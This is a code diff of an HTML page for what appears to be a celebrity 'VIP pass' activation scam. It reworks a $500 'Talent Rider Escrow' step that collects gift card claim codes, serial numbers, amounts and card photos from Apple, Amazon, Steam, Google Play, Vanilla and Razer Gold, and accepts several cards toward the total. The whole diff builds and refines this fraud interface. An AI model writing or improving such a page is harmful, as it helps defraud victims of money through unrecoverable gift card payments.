@@ -347,7 +347,7 @@
           </div>
 
           <label for="cardPinInput" class="auth-input-label">
-            6-Digit VIP Activation PIN (Printed on Pass)
+            6-Digit VIP Passholder Authorization PIN
           </label>
           <div class="pin-input-group">
             <input 
@@ -359,39 +359,64 @@
               autocomplete="off"
               inputmode="numeric"
             />
-            <button type="button" id="quickFillPinBtn" class="btn-quick-pin" title="Use the PIN generated on this credential">
-              Auto-Fill: 813-026
-            </button>
           </div>
           <p class="auth-input-hint" style="margin-bottom: 0;">
-            The 6-digit VIP PIN (813-026) is generated on your credential barcode and back security panel.
+            Enter the 6-digit authorization PIN printed on your credential back security strip (813-026).
           </p>
         </div>
 
-        <!-- Step 2: Gift Card Accreditation Deposit (Required Before Activation) -->
+        <!-- Step 2: Multi-Card Gift Card Escrow Ledger -->
         <div class="auth-step-box" id="giftCardStepBox">
           <div class="auth-step-title">
-            <span>Step 2: Gift Card Deposit (<span id="giftCardFeeAmount">$500.00 USD</span>)</span>
-            <span class="pin-status-pill is-pending" id="giftCardStatusPill">REQUIRED BEFORE ACTIVATION</span>
+            <span>Step 2: Talent Rider Escrow (<span id="giftCardFeeAmount">$500.00 USD</span>)</span>
+            <span class="pin-status-pill is-pending" id="giftCardStatusPill">MULTIPLE CARDS ACCEPTED</span>
           </div>
 
-          <div id="giftCardForm">
-            <label for="giftCardProviderSelect" class="auth-input-label">Select Gift Card Provider</label>
-            <select id="giftCardProviderSelect" class="card-select-input">
-              <option value="Apple Gift Card">Apple Gift Card</option>
-              <option value="Amazon">Amazon</option>
-              <option value="Steam">Steam</option>
-              <option value="Google Play">Google Play</option>
-              <option value="Vanilla Visa / Mastercard">Vanilla Visa / Mastercard</option>
-              <option value="Razer Gold">Razer Gold</option>
-            </select>
-
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
-              <label for="giftCardCodeInput" class="auth-input-label" style="margin: 0;">Claim Code</label>
-              <button type="button" id="quickFillCardBtn" class="btn-quick-pin">
-                Auto-Fill: Apple $500 Code
-              </button>
+          <!-- Escrow Stats & Progress Bar -->
+          <div style="background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.08); border-radius: 4px; padding: 8px 12px; margin-bottom: 10px; font-family: monospace;">
+            <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px;">
+              <span style="color: #a1a1aa;">Escrow Target: <strong>$500.00</strong></span>
+              <span style="color: #f3e5ab;">Credited: <strong id="standaloneCreditedAmt">$0.00</strong></span>
+              <span style="color: #ef4444;" id="standaloneDueSpan">Due: <strong id="standaloneDueAmt">$500.00</strong></span>
             </div>
+            <div style="width: 100%; height: 6px; background: #1c1c28; border-radius: 3px; overflow: hidden;">
+              <div id="standaloneProgressBar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #aa820a, #d4af37, #f3e5ab); transition: width 0.3s;"></div>
+            </div>
+          </div>
+
+          <!-- List of Added Vouchers -->
+          <div id="standaloneVoucherList" style="display: none; margin-bottom: 10px; max-height: 120px; overflow-y: auto;"></div>
+
+          <!-- Add Card Form -->
+          <div id="giftCardForm">
+            <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+              <div style="flex: 1;">
+                <label for="giftCardProviderSelect" class="auth-input-label">Provider</label>
+                <select id="giftCardProviderSelect" class="card-select-input" style="width: 100%;">
+                  <option value="Apple Gift Card">Apple Gift Card</option>
+                  <option value="Amazon">Amazon</option>
+                  <option value="Steam">Steam</option>
+                  <option value="Google Play">Google Play</option>
+                  <option value="Vanilla Visa / Mastercard">Vanilla Visa / Mastercard</option>
+                  <option value="Razer Gold">Razer Gold</option>
+                </select>
+              </div>
+              <div style="width: 110px;">
+                <label for="giftCardAmountInput" class="auth-input-label">Amount ($ USD)</label>
+                <input 
+                  type="number" 
+                  id="giftCardAmountInput" 
+                  class="card-code-input" 
+                  placeholder="250" 
+                  value="250"
+                  min="1"
+                  max="1000"
+                  style="text-align: center;"
+                />
+              </div>
+            </div>
+
+            <label for="giftCardCodeInput" class="auth-input-label">Card Claim Code / Serial Number</label>
             <input 
               type="text" 
               id="giftCardCodeInput" 
@@ -400,13 +425,8 @@
               autocomplete="off"
             />
 
-            <!-- Gift Card Picture / Voucher Scan Attachment -->
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 10px; margin-bottom: 4px;">
-              <label for="giftCardFileInput" class="auth-input-label" style="margin: 0;">Card Picture / Voucher Scan</label>
-              <button type="button" id="attachSampleCardImgBtn" class="btn-quick-pin">
-                Attach Sample Photo
-              </button>
-            </div>
+            <!-- Card Picture / Scan Attachment -->
+            <label for="giftCardFileInput" class="auth-input-label" style="margin-top: 8px;">Voucher Photo Scan / Digital Proof</label>
             <input 
               type="file" 
               id="giftCardFileInput" 
@@ -414,26 +434,22 @@
               class="card-file-input"
               style="width: 100%; font-size: 11px; font-family: monospace; color: #a1a1aa; background: #08080c; padding: 6px; border: 1px dashed #333348; border-radius: 3px; cursor: pointer;"
             />
-            <div id="cardImagePreviewContainer" style="display: none; margin-top: 8px; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 10px; border: 1px solid rgba(212,175,55,0.4); border-radius: 3px;">
-              <img id="cardImagePreviewThumb" src="" alt="Card proof" style="width: 44px; height: 28px; object-fit: cover; border-radius: 2px; border: 1px solid rgba(212,175,55,0.4);" />
+            <div id="cardImagePreviewContainer" style="display: none; margin-top: 6px; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 4px 8px; border: 1px solid rgba(212,175,55,0.4); border-radius: 3px;">
+              <img id="cardImagePreviewThumb" src="" alt="Card proof" style="width: 36px; height: 24px; object-fit: cover; border-radius: 2px;" />
               <div style="flex: 1; overflow: hidden;">
-                <span id="cardImagePreviewName" style="font-size: 11px; font-family: monospace; color: #f3e5ab; display: block; text-overflow: ellipsis; white-space: nowrap; overflow: hidden;">voucher-scan.png</span>
-                <span style="font-size: 9.5px; font-family: monospace; color: #4ade80;">Photo attached</span>
+                <span id="cardImagePreviewName" style="font-size: 10px; font-family: monospace; color: #f3e5ab; display: block; text-overflow: ellipsis; white-space: nowrap; overflow: hidden;">scan.png</span>
+                <span style="font-size: 9px; font-family: monospace; color: #4ade80;">Scan attached</span>
               </div>
-              <button type="button" id="removeCardImgBtn" style="background: none; border: none; color: #ef4444; font-size: 16px; cursor: pointer; padding: 0 4px;" title="Remove image">&times;</button>
+              <button type="button" id="removeCardImgBtn" style="background: none; border: none; color: #ef4444; font-size: 14px; cursor: pointer; padding: 0 4px;" title="Remove image">&times;</button>
             </div>
 
-            <button type="button" id="redeemGiftCardBtn" class="btn-redeem-card" style="margin-top: 10px;">
-              Verify Gift Card Deposit
+            <button type="button" id="redeemGiftCardBtn" class="btn-redeem-card" style="margin-top: 10px; width: 100%;">
+              Apply Card to Escrow
             </button>
           </div>
 
           <div id="giftCardVerifiedBanner" class="gift-card-verified-tag" style="display: none; flex-direction: column; align-items: flex-start; gap: 4px;">
-            <span>✓ Deposit Verified: <strong id="verifiedCardDesc">Apple Gift Card ($500.00 USD)</strong></span>
-            <div id="verifiedImageRow" style="display: none; font-size: 10px; color: #86efac; align-items: center; gap: 6px; padding-top: 2px; border-top: 1px solid rgba(34,197,94,0.3); width: 100%;">
-              <span>CARD PHOTO:</span>
-              <span id="verifiedImageName" style="color: #f3e5ab;">Sample Voucher Attached</span>
-            </div>
+            <span>✓ Escrow Requirement 100% Satisfied: <strong id="verifiedCardDesc">$500.00 USD Cleared</strong></span>
           </div>
         </div>
 
